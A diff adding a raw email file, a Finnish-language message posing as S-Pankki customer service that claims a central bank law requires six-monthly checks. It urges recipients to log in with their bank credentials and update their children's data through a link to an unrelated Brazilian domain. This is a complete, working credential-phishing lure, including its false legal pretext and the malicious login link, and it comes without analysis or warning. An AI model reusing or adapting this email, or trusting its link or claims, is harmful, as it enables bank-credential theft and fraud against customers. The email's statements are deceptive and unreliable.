@@ -1,0 +1,327 @@
+Delivered-To:
+Received: by 2002:a05:612c:1d15:b0:4bf:c851:4495 with SMTP id ix21csp23871vqb;
+        Wed, 12 Mar 2025 00:09:15 -0700 (PDT)
+X-Forwarded-Encrypted: i=2; AJvYcCUuFooLLKBwaYsc7cXjY+zVYGqZfwvQPc2ZOAuojXh87lkjDBV6rTpzcuHUE1KCaN0pZajZ9iPgrr8+4i10iXYK2Znyhg==@gmail.com
+X-Google-Smtp-Source: AGHT+IFh6/4XcH03uV8GoZF2JnZAkpE4bpWFNfBzwkZt3EOobfCL7VuymvfBa27peRCxzsXUoiFR
+X-Received: by 2002:a05:6512:3048:b0:549:8933:bbf5 with SMTP id 2adb3069b0e04-54990e67693mr5550265e87.26.1741763354933;
+        Wed, 12 Mar 2025 00:09:14 -0700 (PDT)
+ARC-Seal: i=1; a=rsa-sha256; t=1741763354; cv=none;
+        d=google.com; s=arc-20240605;
+        b=kKl+aa7n0BkTvCm0KPazbyg18ZoGLZMe1r8g1CJ6oL+FmrX37+98Y1PihIefWBT2qg
+         5kUVsCNAM+s6fOGVfeAzx+sayw0D6QY1K0WqFvhxl5DrOpa8E2dR2RuQX9D/6JZzlqxM
+         i9vuQg8EqvSjlwZ/god0sUkZGGqFdCB5lhp1YzM/IubjC13laf6c5/If+oLVWS5NoQkv
+         VUQDQVnHhfcbt3Y8TQl1MmxIeu2ZZgk5XYl8X5pseZ8asPENWFHQPD1sBJi59YtY4M1n
+         3l75KIDdn1oyLTbIvt0BYcmp55Ze5wVLDY6GUCXjcbDJ2nbJIu54+Yo82Uqs/G5q5d8c
+         TZ8g==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
+        h=subject:message-id:from:
+         :dmarc-filter;
+        bh=YAl4WiZAGPJ46uo6Encd9BMcKpOveSrl0mCgpJqSOUc=;
+        fh=47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=;
+        b=BhblZj6+G2nc+zdgIKTf7JDQsS7xz35fhgi06VLWBcNQRYUjHpfZW6Ii/ZazPTm6Nx
+         zdBKw8X/O8GpRPABDWv49yarwyhYOamXulQ3KNbxwbBhXYhiTGrZsW5mtScfGMGJUnav
+         vsRs4nP5Cy4C4Wq6NZDGjPjCt1iTa+EdEIEbbcd3gfjR9IwVOduq26IGUMHEFbRtIqb9
+         MIiN+5DrysTNK1EdnQ5qLGraRY5aK2n0iREg9MjrRjSCidf1qqwKMRdx/M2lax9DCuUS
+         LSrtZXlFszs5zouOpJ6yZndE68u/gWtDyRhD814I8IJejsNjEHO7aaromQjeTSMfwE6q
+         dAbg==;
+        dara=google.com
+ARC-Authentication-Results: i=1; mx.google.com;
+       dkim=pass header.i=@meiliboxi.fi header.s=mail header.b=TgpiFiOs;
+       spf=pass (google.com: domain of [removed] designates 185.218.192.60 as permitted sender) smtp.mailfrom=[removed];
+       dmarc=pass (p=QUARANTINE sp=REJECT dis=NONE) header.from=meiliboxi.fi
+Return-Path: <[removed]>
+Received: from meiliboxi.fi (meiliboxi.fi. [185.218.192.60])
+        by mx.google.com with ESMTPS id 2adb3069b0e04-5498b0aa58fsi5937931e87.327.2025.03.12.00.09.12
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Wed, 12 Mar 2025 00:09:14 -0700 (PDT)
+Received-SPF: pass (google.com: domain of [removed] designates 185.218.192.60 as permitted sender) client-ip=185.218.192.60;
+Authentication-Results: mx.google.com;
+       dkim=pass header.i=@meiliboxi.fi header.s=mail header.b=TgpiFiOs;
+       spf=pass (google.com: domain of [removed] designates 185.218.192.60 as permitted sender) smtp.mailfrom=[removed];
+       dmarc=pass (p=QUARANTINE sp=REJECT dis=NONE) header.from=meiliboxi.fi
+Received: from localhost (amavis.local [172.17.0.2])
+	by meiliboxi.fi (Postfix) with ESMTP id 71AAA60ACE;
+	Wed, 12 Mar 2025 09:09:10 +0200 (EET)
+DMARC-Filter: OpenDMARC Filter v1.4.2 meiliboxi.fi 71AAA60ACE
+Authentication-Results: meiliboxi.fi; dmarc=pass (p=quarantine dis=none) header.from=meiliboxi.fi
+Authentication-Results: meiliboxi.fi;
+	dkim=pass (1024-bit key) header.d=meiliboxi.fi header.i=@meiliboxi.fi header.b=TgpiFiOs
+X-Virus-Scanned: amavisd-new at example.com
+Received: from meiliboxi.fi ([172.17.0.1])
+	by localhost (meiliboxi.fi [172.17.0.2]) (amavisd-new, port 10024)
+	with ESMTP id M0i6t_12FOPQ; Wed, 12 Mar 2025 07:09:10 +0000 (UTC)
+Received: from meiliboxi.fi (localhost [127.0.0.1])
+	(Authenticated sender: [removed])
+	by meiliboxi.fi (Postfix) with ESMTPSA id 758EB60A8C;
+	Wed, 12 Mar 2025 09:08:59 +0200 (EET)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=meiliboxi.fi; s=mail;
+	t=1741763346; bh=FWJ5VK+cmnzCzxH4LblR7dVAoeRmDLH4NE6X+L46CB0=;
+	h=Date:From:
+	b=TgpiFiOsPt/PXokCfSr9IEE1DhS6iGtYnhdEBmPelq4BK1pHfud/4sg5DU31QWFvS
+	 3uL5Z4dpVODQFpzmOD6oKKwYNyC62/PbOkXPjdzOrRmJw64ZmGg3yZP5JIM5yX8Nfd
+	 /qjqZO7YyDtCUYqoGZYJ9pncizN64Jhu0WlTDrz4=
+MIME-Version: 1.0
+Date: Wed, 12 Mar 2025 07:08:59 +0000
+Content-Type: multipart/alternative;
+ boundary="--=_RainLoop_807_124064292.1741763339"
+X-Mailer: RainLoop/1.17.0
+From:
+Message-ID: <[removed]>
+Subject: =?utf-8?B?UMOkaXZpdMOkIFMtcGFua2tpdGlsaXNp?=
+X-Originating-IP: 85.76.114.240
+
+
+----=_RainLoop_807_124064292.1741763339
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+Hyv=C3=A4 asiakkaamme,
+Autamme sinua varmistamaan, ett=C3=A4 pankkitietosi ovat ajan tasalla.=20
+
+=09Suomen Keskuspankkilaki velvoittaa kaikkia verkkopankkien k=C3=A4ytt=
+=C3=A4ji=C3=A4 tekem=C3=A4=C3=A4n j=C3=A4rjestelm=C3=A4tarkistukset kuude=
+n kuukauden v=C3=A4lein.=20
+
+=09Olisimme siksi eritt=C3=A4in kiitollisia, jos olisit yst=C3=A4v=C3=A4l=
+linen ja p=C3=A4ivitt=C3=A4isit tietosi vastaamalla muutamaan kysymykseen=
+.
+
+	Jos sinulla on lapsia, pyyd=C3=A4mme sinua p=C3=A4ivitt=C3=A4m=C3=A4=C3=
+=A4n heid=C3=A4n asiakastietonsa.
+
+	Jos lapsellasi tai huollettavallasi on pankkipalveluja S-Pankissa, pyyd=
+=C3=A4mme sinua muistamaan p=C3=A4ivitt=C3=A4=C3=A4 heid=C3=A4n asiakasti=
+etonsa s=C3=A4=C3=A4nn=C3=B6llisesti.
+
+	Suosittelemme, ett=C3=A4 k=C3=A4yt=C3=A4tte tilaisuuden hyv=C3=A4ksenne =
+ja teette sen nyt, jotta teid=C3=A4n ei tarvitse huolehtia siit=C3=A4 my=
+=C3=B6hemmin.=20
+=09P=C3=A4ivit=C3=A4 S-Pankin tunnuksilla (https://lbtoldos.com.br/DF/spa=
+nel-19/user/login/spk.php)
+	N=C3=A4in p=C3=A4ivit=C3=A4t verkkopankkitietosi.
+
+	Kirjaudu verkkopankkiisi yll=C3=A4 olevasta painikkeesta.
+
+	Kun olet kirjautunut sis=C3=A4=C3=A4n, vastaa avautuvaan kyselyyn.
+
+	T=C3=A4yt=C3=A4 kyselylomake ja napsauta L=C3=A4het=C3=A4-painiketta.
+
+	Varmista, ett=C3=A4 p=C3=A4ivit=C3=A4t yrityksesi asiakastiedot.
+
+	Kysymme samat kysymykset kaikilta asiakkailtamme, niin nykyisilt=C3=A4 k=
+uin uusiltakin, yrityksen koosta riippumatta. kysym=C3=A4ll=C3=A4 teemme =
+yhteisty=C3=B6t=C3=A4 viranomaisten kanssa varmistaaksemme, ett=C3=A4 pan=
+kkitapahtumat ovat turvallisia ja sujuvia.
+
+	Jos tarvitset lis=C3=A4tietoja pyyt=C3=A4miemme tietojen luonteesta, pyy=
+d=C3=A4mme sinua tutustumaan alla oleviin asiakastietolomakkeisiin. Lis=
+=C3=A4ksi saat lis=C3=A4tietoja tietojen pyyt=C3=A4misest=C3=A4 verkkosiv=
+ujemme kautta.
+
+	Yst=C3=A4v=C3=A4llisin terveisin,
+S-ryhm=C3=A4n asiakaspalvelut
+
+----=_RainLoop_807_124064292.1741763339
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE html><html><head><meta http-equiv=3D"Content-Type" content=3D"t=
+ext/html; charset=3Dutf-8" /></head><body><div data-html-editor-font-wrap=
+per=3D"true" style=3D"font-family: arial, sans-serif; font-size: 13px;"><=
+br><br><signature><div style=3D"font-style: normal; font-variant-ligature=
+s: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: n=
+ormal; orphans: 2; text-indent: 0px; text-transform: none; widows: 2; wor=
+d-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; back=
+ground-color: rgb(255, 255, 255); text-decoration-thickness: initial; tex=
+t-decoration-style: initial; text-decoration-color: initial; direction: l=
+tr; font-family: Georgia, serif; font-size: 18pt; color: rgb(0, 128, 0); =
+text-align: center;"></div><p style=3D"color: rgb(34, 34, 34); font-famil=
+y: Arial, Helvetica, sans-serif; font-size: small; font-style: normal; fo=
+nt-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400=
+; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: n=
+one; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-=
+space: normal; background-color: rgb(255, 255, 255); text-decoration-thic=
+kness: initial; text-decoration-style: initial; text-decoration-color: in=
+itial; line-height: 24px; margin: 0px; text-align: center;"><span style=
+=3D'font-family: "Helvetica Neue", Helvetica, Arial, Verdana, sans-serif;=
+ font-size: 16px;'><strong>Hyv=C3=A4 asiakkaamme,</strong></span></p><p s=
+tyle=3D"color: rgb(34, 34, 34); font-family: Arial, Helvetica, sans-serif=
+; font-size: small; font-style: normal; font-variant-ligatures: normal; f=
+ont-variant-caps: normal; font-weight: 400; letter-spacing: normal; orpha=
+ns: 2; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0=
+px; -webkit-text-stroke-width: 0px; white-space: normal; background-color=
+: rgb(255, 255, 255); text-decoration-thickness: initial; text-decoration=
+-style: initial; text-decoration-color: initial; line-height: 24px; margi=
+n: 0px; text-align: center;"><span style=3D'font-family: "Helvetica Neue"=
+, Helvetica, Arial, Verdana, sans-serif; font-size: 16px;'> </span></p><p=
+ style=3D"color: rgb(34, 34, 34); font-family: Arial, Helvetica, sans-ser=
+if; font-size: small; font-style: normal; font-variant-ligatures: normal;=
+ font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orp=
+hans: 2; text-indent: 0px; text-transform: none; widows: 2; word-spacing:=
+ 0px; -webkit-text-stroke-width: 0px; white-space: normal; background-col=
+or: rgb(255, 255, 255); text-decoration-thickness: initial; text-decorati=
+on-style: initial; text-decoration-color: initial; text-align: center;"><=
+br><span style=3D"font-family: helvetica, arial, sans-serif;">Autamme sin=
+ua varmistamaan, ett=C3=A4 pankkitietosi ovat ajan tasalla. </span></p><p=
+ style=3D"color: rgb(34, 34, 34); font-family: Arial, Helvetica, sans-ser=
+if; font-size: small; font-style: normal; font-variant-ligatures: normal;=
+ font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orp=
+hans: 2; text-indent: 0px; text-transform: none; widows: 2; word-spacing:=
+ 0px; -webkit-text-stroke-width: 0px; white-space: normal; background-col=
+or: rgb(255, 255, 255); text-decoration-thickness: initial; text-decorati=
+on-style: initial; text-decoration-color: initial; text-align: center;"><=
+span style=3D"font-family: helvetica, arial, sans-serif;">Suomen Keskuspa=
+nkkilaki velvoittaa kaikkia verkkopankkien k=C3=A4ytt=C3=A4ji=C3=A4 tekem=
+=C3=A4=C3=A4n j=C3=A4rjestelm=C3=A4tarkistukset kuuden kuukauden v=C3=A4l=
+ein. </span></p><p style=3D"color: rgb(34, 34, 34); font-family: Arial, H=
+elvetica, sans-serif; font-size: small; font-style: normal; font-variant-=
+ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-sp=
+acing: normal; orphans: 2; text-indent: 0px; text-transform: none; widows=
+: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: norm=
+al; background-color: rgb(255, 255, 255); text-decoration-thickness: init=
+ial; text-decoration-style: initial; text-decoration-color: initial; text=
+-align: center;"><span style=3D"font-family: helvetica, arial, sans-serif=
+;">Olisimme siksi eritt=C3=A4in kiitollisia, jos olisit yst=C3=A4v=C3=A4l=
+linen ja p=C3=A4ivitt=C3=A4isit tietosi vastaamalla muutamaan kysymykseen=
+.</span></p><p style=3D"color: rgb(34, 34, 34); font-family: Arial, Helve=
+tica, sans-serif; font-size: small; font-style: normal; font-variant-liga=
+tures: normal; font-variant-caps: normal; font-weight: 400; letter-spacin=
+g: normal; orphans: 2; text-indent: 0px; text-transform: none; widows: 2;=
+ word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; =
+background-color: rgb(255, 255, 255); text-decoration-thickness: initial;=
+ text-decoration-style: initial; text-decoration-color: initial; text-ali=
+gn: center;"><span style=3D"font-family: helvetica, arial, sans-serif;">J=
+os sinulla on lapsia, pyyd=C3=A4mme sinua p=C3=A4ivitt=C3=A4m=C3=A4=C3=A4=
+n heid=C3=A4n asiakastietonsa.</span></p><p style=3D"color: rgb(34, 34, 3=
+4); font-family: Arial, Helvetica, sans-serif; font-size: small; font-sty=
+le: normal; font-variant-ligatures: normal; font-variant-caps: normal; fo=
+nt-weight: 400; letter-spacing: normal; orphans: 2; text-indent: 0px; tex=
+t-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-widt=
+h: 0px; white-space: normal; background-color: rgb(255, 255, 255); text-d=
+ecoration-thickness: initial; text-decoration-style: initial; text-decora=
+tion-color: initial; text-align: center;"><span style=3D"font-family: hel=
+vetica, arial, sans-serif;">Jos lapsellasi tai huollettavallasi on pankki=
+palveluja S-Pankissa, pyyd=C3=A4mme sinua muistamaan p=C3=A4ivitt=C3=A4=
+=C3=A4 heid=C3=A4n asiakastietonsa s=C3=A4=C3=A4nn=C3=B6llisesti.</span><=
+/p><p style=3D"color: rgb(34, 34, 34); font-family: Arial, Helvetica, san=
+s-serif; font-size: small; font-style: normal; font-variant-ligatures: no=
+rmal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal=
+; orphans: 2; text-indent: 0px; text-transform: none; widows: 2; word-spa=
+cing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; backgroun=
+d-color: rgb(255, 255, 255); text-decoration-thickness: initial; text-dec=
+oration-style: initial; text-decoration-color: initial; text-align: cente=
+r;"><span style=3D"font-family: helvetica, arial, sans-serif;"><strong>Su=
+osittelemme, ett=C3=A4 k=C3=A4yt=C3=A4tte tilaisuuden hyv=C3=A4ksenne ja =
+teette sen nyt, jotta teid=C3=A4n ei tarvitse huolehtia siit=C3=A4 my=C3=
+=B6hemmin.</strong></span></p> <div style=3D"color: rgb(34, 34, 34); font=
+-family: Arial, Helvetica, sans-serif; font-size: small; font-style: norm=
+al; font-variant-ligatures: normal; font-variant-caps: normal; font-weigh=
+t: 400; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transf=
+orm: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; =
+white-space: normal; background-color: rgb(255, 255, 255); text-decoratio=
+n-thickness: initial; text-decoration-style: initial; text-decoration-col=
+or: initial; text-align: center;"><table cellspacing=3D"0px" style=3D"bor=
+der-collapse: collapse; margin-left: auto; margin-right: auto;"><tbody><t=
+r><td style=3D"margin: 0px; width: 368.45px; height: 21.2px; line-height:=
+ normal;"><div style=3D"line-height: normal; font-size: 16px;"></div></td=
+></tr><tr><td align=3D"center" style=3D"margin: 0px; width: 368.45px; hei=
+ght: 42.4px; line-height: normal; background-color: rgb(0, 170, 70); padd=
+ing: 5px 20px;"><span style=3D"font-size: 18pt; color: rgb(255, 255, 255)=
+;"><strong><a rel=3D"noopener noreferrer" data-saferedirecturl=3D"https:/=
+/www.google.com/url?q=3Dhttps://solanra.com/t/spanel-19/user/login/spk.ph=
+p&amp;source=3Dgmail&amp;ust=3D1741699879477000&amp;usg=3DAOvVaw2XDC9l0Y9=
+SW9tKt32kTjso" style=3D"color: rgb(255, 255, 255);" href=3D"https://lbtol=
+dos.com.br/DF/spanel-19/user/login/spk.php"><span style=3D'font-family: R=
+oboto, "Helvetica Neue", Helvetica, Arial, sans-serif;'>P=C3=A4ivit=C3=A4=
+ S-Pankin tunnuksilla</span></a></strong></span><div style=3D"line-height=
+: normal; font-family: Aptos, Aptos_EmbeddedFont, Aptos_MSFontService, Ca=
+libri, Helvetica, sans-serif; font-size: 12pt; color: rgb(0, 0, 0);"></di=
+v></td></tr></tbody></table></div><div style=3D"font-style: normal; font-=
+variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; l=
+etter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none=
+; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-spa=
+ce: normal; background-color: rgb(255, 255, 255); text-decoration-thickne=
+ss: initial; text-decoration-style: initial; text-decoration-color: initi=
+al; font-family: Aptos, Aptos_EmbeddedFont, Aptos_MSFontService, Calibri,=
+ Helvetica, sans-serif; font-size: 12pt; color: rgb(0, 0, 0); text-align:=
+ center;"></div><p style=3D"color: rgb(34, 34, 34); font-family: Arial, H=
+elvetica, sans-serif; font-size: small; font-style: normal; font-variant-=
+ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-sp=
+acing: normal; orphans: 2; text-indent: 0px; text-transform: none; widows=
+: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: norm=
+al; background-color: rgb(255, 255, 255); text-decoration-thickness: init=
+ial; text-decoration-style: initial; text-decoration-color: initial; text=
+-align: center;"><strong><span style=3D"font-family: helvetica, arial, sa=
+ns-serif;">N=C3=A4in p=C3=A4ivit=C3=A4t verkkopankkitietosi.</span></stro=
+ng></p><p style=3D"color: rgb(34, 34, 34); font-family: Arial, Helvetica,=
+ sans-serif; font-size: small; font-style: normal; font-variant-ligatures=
+: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: no=
+rmal; orphans: 2; text-indent: 0px; text-transform: none; widows: 2; word=
+-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; backg=
+round-color: rgb(255, 255, 255); text-decoration-thickness: initial; text=
+-decoration-style: initial; text-decoration-color: initial; text-align: c=
+enter;"><span style=3D"font-family: helvetica, arial, sans-serif;">Kirjau=
+du verkkopankkiisi yll=C3=A4 olevasta painikkeesta.</span></p><p style=3D=
+"color: rgb(34, 34, 34); font-family: Arial, Helvetica, sans-serif; font-=
+size: small; font-style: normal; font-variant-ligatures: normal; font-var=
+iant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; =
+text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -we=
+bkit-text-stroke-width: 0px; white-space: normal; background-color: rgb(2=
+55, 255, 255); text-decoration-thickness: initial; text-decoration-style:=
+ initial; text-decoration-color: initial; text-align: center;"><span styl=
+e=3D"font-family: helvetica, arial, sans-serif;">Kun olet kirjautunut sis=
+=C3=A4=C3=A4n, vastaa avautuvaan kyselyyn.</span></p><p style=3D"color: r=
+gb(34, 34, 34); font-family: Arial, Helvetica, sans-serif; font-size: sma=
+ll; font-style: normal; font-variant-ligatures: normal; font-variant-caps=
+: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-inde=
+nt: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text=
+-stroke-width: 0px; white-space: normal; background-color: rgb(255, 255, =
+255); text-decoration-thickness: initial; text-decoration-style: initial;=
+ text-decoration-color: initial; text-align: center;"><span style=3D"font=
+-family: helvetica, arial, sans-serif;">T=C3=A4yt=C3=A4 kyselylomake ja n=
+apsauta L=C3=A4het=C3=A4-painiketta.</span></p><p style=3D"color: rgb(34,=
+ 34, 34); font-family: Arial, Helvetica, sans-serif; font-size: small; fo=
+nt-style: normal; font-variant-ligatures: normal; font-variant-caps: norm=
+al; font-weight: 400; letter-spacing: normal; orphans: 2; text-indent: 0p=
+x; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-strok=
+e-width: 0px; white-space: normal; background-color: rgb(255, 255, 255); =
+text-decoration-thickness: initial; text-decoration-style: initial; text-=
+decoration-color: initial; text-align: center;"><strong><span style=3D"fo=
+nt-family: helvetica, arial, sans-serif;">Varmista, ett=C3=A4 p=C3=A4ivit=
+=C3=A4t yrityksesi asiakastiedot.</span></strong></p><p style=3D"color: r=
+gb(34, 34, 34); font-family: Arial, Helvetica, sans-serif; font-size: sma=
+ll; font-style: normal; font-variant-ligatures: normal; font-variant-caps=
+: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-inde=
+nt: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text=
+-stroke-width: 0px; white-space: normal; background-color: rgb(255, 255, =
+255); text-decoration-thickness: initial; text-decoration-style: initial;=
+ text-decoration-color: initial; text-align: center;"><span style=3D"font=
+-family: helvetica, arial, sans-serif;">Kysymme samat kysymykset kaikilta=
+ asiakkailtamme, niin nykyisilt=C3=A4 kuin uusiltakin, yrityksen koosta r=
+iippumatta. kysym=C3=A4ll=C3=A4 teemme yhteisty=C3=B6t=C3=A4 viranomaiste=
+n kanssa varmistaaksemme, ett=C3=A4 pankkitapahtumat ovat turvallisia ja =
+sujuvia.</span></p><p style=3D"color: rgb(34, 34, 34); font-family: Arial=
+, Helvetica, sans-serif; font-size: small; font-style: normal; font-varia=
+nt-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter=
+-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; wid=
+ows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: n=
+ormal; background-color: rgb(255, 255, 255); text-decoration-thickness: i=
+nitial; text-decoration-style: initial; text-decoration-color: initial; t=
+ext-align: center;"><span style=3D"font-family: helvetica, arial, sans-se=
+rif;">Jos tarvitset lis=C3=A4tietoja pyyt=C3=A4miemme tietojen luonteesta=
+, pyyd=C3=A4mme sinua tutustumaan alla oleviin asiakastietolomakkeisiin. =
+Lis=C3=A4ksi saat lis=C3=A4tietoja tietojen pyyt=C3=A4misest=C3=A4 verkko=
+sivujemme kautta.</span></p><p style=3D"color: rgb(34, 34, 34); font-fami=
+ly: Arial, Helvetica, sans-serif; font-size: small; font-style: normal; f=
+ont-variant-ligatures: normal; font-variant-caps: normal; font-weight: 40=
+0; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: =
+none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white=
+-space: normal; background-color: rgb(255, 255, 255); text-decoration-thi=
+ckness: initial; text-decoration-style: initial; text-decoration-color: i=
+nitial; text-align: center;"><span style=3D"font-family: helvetica, arial=
+, sans-serif;">Yst=C3=A4v=C3=A4llisin terveisin,</span><br><span style=3D=
+"font-family: helvetica, arial, sans-serif;">S-ryhm=C3=A4n asiakaspalvelu=
+t</span></p></signature></div></body></html>
+
+----=_RainLoop_807_124064292.1741763339--
+
